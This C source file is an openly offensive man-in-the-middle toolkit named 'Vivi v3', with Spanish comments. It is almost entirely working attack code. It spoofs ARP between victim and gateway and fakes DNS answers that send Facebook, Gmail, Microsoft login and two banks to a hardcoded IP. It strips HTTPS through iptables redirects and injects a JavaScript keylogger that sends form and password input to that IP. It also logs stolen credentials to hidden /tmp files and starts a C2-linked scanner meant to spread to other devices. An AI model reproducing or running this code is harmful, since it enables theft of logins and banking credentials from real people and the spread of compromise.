// Vivi v3 - Advanced MITM: SSL Strip, DNS Spoof, HTTP Injection, Phishing
// Manipula lo que ve la víctima en tiempo real
// + DISTRIBUTED SCANNER: También escanea y se propaga

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <openssl/ssl.h>
#include <json-c/json.h>
#include <pthread.h>
#include <time.h>
#include <netdb.h>
#include <fcntl.h>
#include "config.h"
#include "distributed_scanner.h"

// ============================================================================
// STRUCTURES
// ============================================================================

typedef struct {
    unsigned char dst_mac[6];
    unsigned char src_mac[6];
    unsigned short eth_type;
} __attribute__((packed)) eth_header;

typedef struct {
    unsigned short hw_type;
    unsigned short proto_type;
    unsigned char hw_len;
    unsigned char proto_len;
    unsigned short opcode;
    unsigned char sender_mac[6];
    unsigned char sender_ip[4];
    unsigned char target_mac[6];
    unsigned char target_ip[4];
} __attribute__((packed)) arp_packet;

typedef struct {
    unsigned short id;
    unsigned short flags;
    unsigned short qcount;
    unsigned short ancount;
    unsigned short nscount;
    unsigned short arcount;
} __attribute__((packed)) dns_header;

// Global state
char target_ip[32];
char gateway_ip[32];
char our_mac[6];
char target_mac[6];
const char *iface = NULL;

// ============================================================================
// MAC ADDRESS UTILITIES
// ============================================================================

int get_mac_address(const char *iface_name, unsigned char *mac) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;
    
    strncpy(ifr.ifr_name, iface_name, IFNAMSIZ-1);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return -1;
    }
    
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    return 0;
}

const char *get_interface() {
    static char iface_buf[IFNAMSIZ] = {0};
    const char *interfaces[] = {"eth0", "ens33", "enp0s3", "wlan0", "wlp2s0", NULL};
    
    for (int i = 0; interfaces[i] != NULL; i++) {
        unsigned char mac[6];
        if (get_mac_address(interfaces[i], mac) == 0) {
            strncpy(iface_buf, interfaces[i], IFNAMSIZ-1);
            return iface_buf;
        }
    }
    return "eth0";
}

// Get MAC from IP via ARP table
int get_mac_from_ip(const char *ip, unsigned char *mac) {
    FILE *fp = fopen("/proc/net/arp", "r");
    if (!fp) return -1;
    
    char line[256];
    fgets(line, sizeof(line), fp); // Skip header
    
    while (fgets(line, sizeof(line), fp)) {
        char arp_ip[32], hw_type[8], flags[8], arp_mac[32];
        sscanf(line, "%s %s %s %s", arp_ip, hw_type, flags, arp_mac);
        
        if (strcmp(arp_ip, ip) == 0) {
            sscanf(arp_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
            fclose(fp);
            return 0;
        }
    }
    fclose(fp);
    return -1;
}

// ============================================================================
// CHECKSUM CALCULATION
// ============================================================================

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    
    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    
    if (len == 1)
        sum += *(unsigned char *)buf;
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return (unsigned short)(~sum);
}

// ============================================================================
// ARP SPOOFING (Bidirectional)
// ============================================================================

int send_arp_reply(const char *dst_ip, const unsigned char *dst_mac,
                   const char *src_ip, const unsigned char *src_mac) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) return -1;
    
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    ioctl(sock, SIOCGIFINDEX, &ifr);
    
    unsigned char buffer[42];
    memset(buffer, 0, sizeof(buffer));
    
    eth_header *eth = (eth_header *)buffer;
    arp_packet *arp = (arp_packet *)(buffer + sizeof(eth_header));
    
    memcpy(eth->dst_mac, dst_mac, 6);
    memcpy(eth->src_mac, src_mac, 6);
    eth->eth_type = htons(ETH_P_ARP);
    
    arp->hw_type = htons(1);
    arp->proto_type = htons(0x0800);
    arp->hw_len = 6;
    arp->proto_len = 4;
    arp->opcode = htons(2); // ARP Reply
    
    memcpy(arp->sender_mac, src_mac, 6);
    inet_pton(AF_INET, src_ip, arp->sender_ip);
    memcpy(arp->target_mac, dst_mac, 6);
    inet_pton(AF_INET, dst_ip, arp->target_ip);
    
    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_halen = 6;
    memcpy(addr.sll_addr, dst_mac, 6);
    
    sendto(sock, buffer, 42, 0, (struct sockaddr*)&addr, sizeof(addr));
    close(sock);
    return 0;
}

void *arp_spoof_thread(void *arg) {
    (void)arg;
    
    FILE *fp = fopen("/proc/sys/net/ipv4/ip_forward", "w");
    if (fp) {
        fprintf(fp, "1\n");
        fclose(fp);
    }
    
    unsigned char gateway_mac[6];
    get_mac_from_ip(gateway_ip, gateway_mac);
    
    printf("[Vivi v3] ARP Spoofing: %s <-> %s\n", target_ip, gateway_ip);
    
    while (1) {
        // Tell target we are gateway
        send_arp_reply(target_ip, target_mac, gateway_ip, our_mac);
        
        // Tell gateway we are target
        send_arp_reply(gateway_ip, gateway_mac, target_ip, our_mac);
        
        sleep(2);
    }
    return NULL;
}

// ============================================================================
// DNS SPOOFING (Redirect domains to phishing)
// ============================================================================

typedef struct {
    char domain[256];
    char redirect_ip[16];
} dns_spoof_entry;

dns_spoof_entry dns_spoof_list[] = {
    {"facebook.com", "207.244.255.208"},
    {"www.facebook.com", "207.244.255.208"},
    {"instagram.com", "207.244.255.208"},
    {"www.instagram.com", "207.244.255.208"},
    {"twitter.com", "207.244.255.208"},
    {"gmail.com", "207.244.255.208"},
    {"accounts.google.com", "207.244.255.208"},
    {"login.live.com", "207.244.255.208"},
    {"secure.bankpopular.com", "207.244.255.208"},
    {"www.banreservas.com", "207.244.255.208"},
    {"", ""}
};

void *dns_spoof_thread(void *arg) {
    (void)arg;
    
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) return NULL;
    
    printf("[Vivi v3] DNS Spoofing active\n");
    
    unsigned char buffer[4096];
    
    while (1) {
        ssize_t len = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
        if (len < 42) continue;
        
        eth_header *eth = (eth_header *)buffer;
        if (ntohs(eth->eth_type) != 0x0800) continue;
        
        struct iphdr *iph = (struct iphdr *)(buffer + 14);
        if (iph->protocol != 17) continue; // UDP
        
        struct udphdr *udph = (struct udphdr *)(buffer + 14 + (iph->ihl * 4));
        if (ntohs(udph->dest) != 53) continue; // DNS
        
        dns_header *dnsh = (dns_header *)(buffer + 14 + (iph->ihl * 4) + 8);
        if (ntohs(dnsh->flags) & 0x8000) continue; // Skip responses
        
        // Extract domain from DNS query
        unsigned char *query = (unsigned char *)dnsh + sizeof(dns_header);
        char domain[256] = {0};
        int pos = 0;
        
        while (*query != 0) {
            int len = *query++;
            if (pos > 0) domain[pos++] = '.';
            memcpy(domain + pos, query, len);
            pos += len;
            query += len;
        }
        
        // Check if domain should be spoofed
        char *redirect_ip = NULL;
        for (int i = 0; dns_spoof_list[i].domain[0] != '\0'; i++) {
            if (strcasecmp(domain, dns_spoof_list[i].domain) == 0) {
                redirect_ip = dns_spoof_list[i].redirect_ip;
                break;
            }
        }
        
        if (redirect_ip) {
            printf("[DNS Spoof] %s -> %s\n", domain, redirect_ip);
            
            // Build spoofed DNS response
            unsigned char response[512];
            memcpy(response, buffer, len);
            
            eth_header *resp_eth = (eth_header *)response;
            memcpy(resp_eth->dst_mac, resp_eth->src_mac, 6);
            memcpy(resp_eth->src_mac, our_mac, 6);
            
            struct iphdr *resp_iph = (struct iphdr *)(response + 14);
            uint32_t tmp_ip = resp_iph->saddr;
            resp_iph->saddr = resp_iph->daddr;
            resp_iph->daddr = tmp_ip;
            
            struct udphdr *resp_udph = (struct udphdr *)(response + 14 + (resp_iph->ihl * 4));
            uint16_t tmp_port = resp_udph->source;
            resp_udph->source = resp_udph->dest;
            resp_udph->dest = tmp_port;
            
            dns_header *resp_dnsh = (dns_header *)(response + 14 + (resp_iph->ihl * 4) + 8);
            resp_dnsh->flags = htons(0x8180); // Response + Authoritative
            resp_dnsh->ancount = htons(1);
            
            // Add answer (pointer to question + A record)
            int dns_offset = 14 + (resp_iph->ihl * 4) + 8 + sizeof(dns_header) + strlen(domain) + 6;
            response[dns_offset++] = 0xc0;
            response[dns_offset++] = 0x0c; // Pointer to query
            response[dns_offset++] = 0x00;
            response[dns_offset++] = 0x01; // Type A
            response[dns_offset++] = 0x00;
            response[dns_offset++] = 0x01; // Class IN
            response[dns_offset++] = 0x00;
            response[dns_offset++] = 0x00;
            response[dns_offset++] = 0x00;
            response[dns_offset++] = 0x3c; // TTL 60 sec
            response[dns_offset++] = 0x00;
            response[dns_offset++] = 0x04; // Data length
            
            // IP address
            struct in_addr spoofed_addr;
            inet_pton(AF_INET, redirect_ip, &spoofed_addr);
            memcpy(response + dns_offset, &spoofed_addr, 4);
            dns_offset += 4;
            
            // Update lengths and checksums
            resp_iph->tot_len = htons(dns_offset - 14);
            resp_udph->len = htons(dns_offset - 14 - (resp_iph->ihl * 4));
            resp_iph->check = 0;
            resp_iph->check = checksum(resp_iph, resp_iph->ihl * 4);
            resp_udph->check = 0;
            
            // Send spoofed response
            sendto(sock, response, dns_offset, 0, NULL, 0);
        }
    }
    
    close(sock);
    return NULL;
}

// ============================================================================
// SSL STRIPPING (Downgrade HTTPS to HTTP)
// ============================================================================

void *ssl_strip_thread(void *arg) {
    (void)arg;
    
    // Redirect HTTPS (443) to HTTP proxy
    system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443 2>/dev/null");
    
    printf("[Vivi v3] SSL Stripping active on port 8443\n");
    
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(8443);
    
    bind(server_sock, (struct sockaddr*)&addr, sizeof(addr));
    listen(server_sock, 10);
    
    while (1) {
        int client_sock = accept(server_sock, NULL, NULL);
        if (client_sock < 0) continue;
        
        // Read HTTPS request
        char buffer[8192];
        int n = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
        if (n <= 0) {
            close(client_sock);
            continue;
        }
        buffer[n] = '\0';
        
        // Extract Host header
        char *host_line = strstr(buffer, "Host: ");
        if (!host_line) {
            close(client_sock);
            continue;
        }
        
        char host[256];
        sscanf(host_line + 6, "%255[^\r\n]", host);
        
        // Log stripped connection
        FILE *fp = fopen("/tmp/.ssl_stripped", "a");
        if (fp) {
            fprintf(fp, "[%ld] HTTPS->HTTP: %s\n", time(NULL), host);
            fclose(fp);
        }
        
        // Send redirect to HTTP version
        char response[1024];
        snprintf(response, sizeof(response),
            "HTTP/1.1 302 Found\r\n"
            "Location: http://%s\r\n"
            "Content-Length: 0\r\n"
            "Connection: close\r\n\r\n",
            host);
        
        send(client_sock, response, strlen(response), 0);
        close(client_sock);
    }
    
    return NULL;
}

// ============================================================================
// HTTP INJECTION (Inject JS/HTML into pages)
// ============================================================================

const char *injection_script = 
    "<script>"
    "document.addEventListener('DOMContentLoaded',function(){"
    "var forms=document.getElementsByTagName('form');"
    "for(var i=0;i<forms.length;i++){"
    "  forms[i].addEventListener('submit',function(e){"
    "    var data=new FormData(this);"
    "    var xhr=new XMLHttpRequest();"
    "    xhr.open('POST','http://207.244.255.208:9999/log',true);"
    "    xhr.send(data);"
    "  });"
    "}"
    "if(document.querySelector('[type=password]')){"
    "  document.querySelectorAll('input').forEach(function(inp){"
    "    inp.addEventListener('blur',function(){"
    "      var xhr=new XMLHttpRequest();"
    "      xhr.open('POST','http://207.244.255.208:9999/log',true);"
    "      xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');"
    "      xhr.send('field='+this.name+'&value='+encodeURIComponent(this.value));"
    "    });"
    "  });"
    "}"
    "});"
    "</script>";

void *http_inject_thread(void *arg) {
    (void)arg;
    
    // Redirect HTTP (80) to injection proxy
    system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null");
    
    printf("[Vivi v3] HTTP Injection active on port 8080\n");
    
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(8080);
    
    bind(server_sock, (struct sockaddr*)&addr, sizeof(addr));
    listen(server_sock, 10);
    
    while (1) {
        int client_sock = accept(server_sock, NULL, NULL);
        if (client_sock < 0) continue;
        
        char buffer[16384];
        int n = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
        if (n <= 0) {
            close(client_sock);
            continue;
        }
        buffer[n] = '\0';
        
        // Extract Host
        char *host_line = strstr(buffer, "Host: ");
        if (!host_line) {
            close(client_sock);
            continue;
        }
        
        char host[256];
        sscanf(host_line + 6, "%255[^\r\n]", host);
        
        // Forward request to real server
        struct hostent *he = gethostbyname(host);
        if (!he) {
            close(client_sock);
            continue;
        }
        
        int remote_sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in remote_addr;
        remote_addr.sin_family = AF_INET;
        remote_addr.sin_port = htons(80);
        memcpy(&remote_addr.sin_addr, he->h_addr_list[0], he->h_length);
        
        if (connect(remote_sock, (struct sockaddr*)&remote_addr, sizeof(remote_addr)) == 0) {
            send(remote_sock, buffer, n, 0);
            
            // Receive response
            char response[65536];
            int total = 0;
            int bytes;
            
            while ((bytes = recv(remote_sock, response + total, sizeof(response) - total - 1, 0)) > 0) {
                total += bytes;
                if (total > 60000) break; // Limit size
            }
            
            if (total > 0) {
                response[total] = '\0';
                
                // Inject script before </body>
                char *body_end = strcasestr(response, "</body>");
                if (body_end) {
                    int pos = body_end - response;
                    char injected[70000];
                    memcpy(injected, response, pos);
                    strcpy(injected + pos, injection_script);
                    strcpy(injected + pos + strlen(injection_script), body_end);
                    
                    // Update Content-Length
                    char *content_length = strcasestr(injected, "Content-Length:");
                    if (content_length) {
                        int new_len = strlen(injected + (strstr(injected, "\r\n\r\n") - injected + 4));
                        char new_header[128];
                        snprintf(new_header, sizeof(new_header), "Content-Length: %d", new_len);
                        
                        char *end_of_line = strstr(content_length, "\r\n");
                        if (end_of_line) {
                            memmove(content_length + strlen(new_header), end_of_line, 
                                   strlen(end_of_line) + 1);
                            memcpy(content_length, new_header, strlen(new_header));
                        }
                    }
                    
                    send(client_sock, injected, strlen(injected), 0);
                } else {
                    send(client_sock, response, total, 0);
                }
            }
        }
        
        close(remote_sock);
        close(client_sock);
    }
    
    return NULL;
}

// ============================================================================
// CREDENTIAL LOGGER (Receive stolen creds)
// ============================================================================

void *credential_logger_thread(void *arg) {
    (void)arg;
    
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(9999);
    
    bind(server_sock, (struct sockaddr*)&addr, sizeof(addr));
    listen(server_sock, 10);
    
    printf("[Vivi v3] Credential logger listening on port 9999\n");
    
    while (1) {
        int client_sock = accept(server_sock, NULL, NULL);
        if (client_sock < 0) continue;
        
        char buffer[8192];
        int n = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
        if (n > 0) {
            buffer[n] = '\0';
            
            // Log credentials
            FILE *fp = fopen("/tmp/.phished_creds", "a");
            if (fp) {
                time_t now = time(NULL);
                fprintf(fp, "\n[%ld] Captured from victim %s:\n%s\n", 
                       now, target_ip, buffer);
                fclose(fp);
            }
            
            printf("[PHISHED] Captured credentials from %s\n", target_ip);
        }
        
        // Send OK response
        char *response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
        send(client_sock, response, strlen(response), 0);
        close(client_sock);
    }
    
    return NULL;
}

// ============================================================================
// DISTRIBUTED SCANNER INTEGRATION
// ============================================================================

void vivi_scanner_report(const char *type, const char *message) {
    // Vivi puede reportar a archivo o stdout
    time_t now = time(NULL);
    char timestamp[32];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    
    FILE *fp = fopen("/tmp/.vivi_scanner.log", "a");
    if (fp) {
        fprintf(fp, "[%s] %s: %s\n", timestamp, type, message);
        fclose(fp);
    }
    
    printf("[SCANNER] %s: %s\n", type, message);
}

void *vivi_scanner_thread(void *arg) {
    (void)arg;
    
    sleep(30); // Esperar 30s antes de empezar a escanear (dejar que MITM se estabilice)
    
    ScannerConfig config;
    config.targets_per_round = 50;  // Menos agresivo que higurashi
    config.scan_interval = 120;     // 2 minutos entre rondas
    config.report_callback = vivi_scanner_report;
    strncpy(config.c2_host, C2_HOST, sizeof(config.c2_host) - 1);
    config.c2_port = C2_PORT;
    
    printf("[*] Vivi Scanner: Starting distributed scan (low-profile mode)\n");
    distributed_scanner_thread(&config);
    
    return NULL;
}

// ============================================================================
// MAIN
// ============================================================================

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <target_ip> [gateway_ip]\n", argv[0]);
        fprintf(stderr, "Example: %s 192.168.1.100\n", argv[0]);
        fprintf(stderr, "         %s 192.168.1.100 192.168.1.1\n", argv[0]);
        return 1;
    }
    
    strncpy(target_ip, argv[1], sizeof(target_ip) - 1);
    
    // Get gateway
    if (argc >= 3) {
        strncpy(gateway_ip, argv[2], sizeof(gateway_ip) - 1);
    } else {
        strcpy(gateway_ip, "192.168.1.1");
        FILE *fp = popen("ip route | grep default | awk '{print $3}'", "r");
        if (fp) {
            if (fgets(gateway_ip, sizeof(gateway_ip), fp) != NULL) {
                gateway_ip[strcspn(gateway_ip, "\n")] = '\0';
            }
            pclose(fp);
        }
    }
    
    iface = get_interface();
    get_mac_address(iface, (unsigned char *)our_mac);
    
    // Get target MAC
    sleep(1);
    if (get_mac_from_ip(target_ip, (unsigned char *)target_mac) < 0) {
        fprintf(stderr, "[-] Cannot find MAC for %s. Pinging...\n", target_ip);
        char cmd[128];
        snprintf(cmd, sizeof(cmd), "ping -c 1 %s >/dev/null 2>&1", target_ip);
        system(cmd);
        sleep(1);
        if (get_mac_from_ip(target_ip, (unsigned char *)target_mac) < 0) {
            fprintf(stderr, "[-] Failed to get target MAC. Exiting.\n");
            return 1;
        }
    }
    
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║         VIVI v3 - Advanced MITM Attack Suite                ║\n");
    printf("╠══════════════════════════════════════════════════════════════╣\n");
    printf("║ Target:    %-45s ║\n", target_ip);
    printf("║ Gateway:   %-45s ║\n", gateway_ip);
    printf("║ Interface: %-45s ║\n", iface);
    printf("║ Our MAC:   %02x:%02x:%02x:%02x:%02x:%02x                               ║\n",
           (unsigned char)our_mac[0], (unsigned char)our_mac[1], 
           (unsigned char)our_mac[2], (unsigned char)our_mac[3],
           (unsigned char)our_mac[4], (unsigned char)our_mac[5]);
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");
    
    printf("[*] Starting attack modules...\n");
    
    // Start attack threads
    pthread_t threads[7];
    
    pthread_create(&threads[0], NULL, arp_spoof_thread, NULL);
    pthread_create(&threads[1], NULL, dns_spoof_thread, NULL);
    pthread_create(&threads[2], NULL, ssl_strip_thread, NULL);
    pthread_create(&threads[3], NULL, http_inject_thread, NULL);
    pthread_create(&threads[4], NULL, credential_logger_thread, NULL);
    pthread_create(&threads[5], NULL, vivi_scanner_thread, NULL); // NUEVO: Scanner distribuido
    
    printf("\n[+] All attack modules active!\n");
    printf("[*] ARP Spoofing:      Victim thinks we are the gateway\n");
    printf("[*] DNS Spoofing:      Redirecting: Facebook, Instagram, Gmail, Banks\n");
    printf("[*] SSL Stripping:     HTTPS -> HTTP downgrade\n");
    printf("[*] HTTP Injection:    JavaScript keylogger injected\n");
    printf("[*] Credential Logger: Listening on port 9999\n");
    printf("[*] Distributed Scanner: Scanning Internet for vulnerable devices\n"); // NUEVO
    printf("\n[*] Stolen credentials: /tmp/.phished_creds\n");
    printf("[*] SSL strips logged: /tmp/.ssl_stripped\n");
    printf("[*] Scanner logs:      /tmp/.vivi_scanner.log\n"); // NUEVO
    printf("[*] Press Ctrl+C to stop\n\n");
    
    // Keep alive
    pthread_join(threads[0], NULL);
    
    return 0;
}
